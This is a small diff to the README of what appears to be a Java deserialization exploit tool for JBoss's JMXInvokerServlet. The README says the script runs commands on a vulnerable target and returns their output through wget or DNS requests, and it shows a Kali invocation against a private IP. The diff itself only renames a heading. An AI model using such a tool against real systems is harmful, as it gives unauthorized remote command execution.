@@ -9,7 +9,7 @@ http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-
 
 this script lets you execute and retrieve commands output (through wget or dns requests) from a vulnerable target like in a shell.
 
-## Examples
+## Example
 ```shell
 root@kali:~/script/JMXInvokerServlet-exec/wget# python cmd_shell.py 192.168.1.20 
 $> id
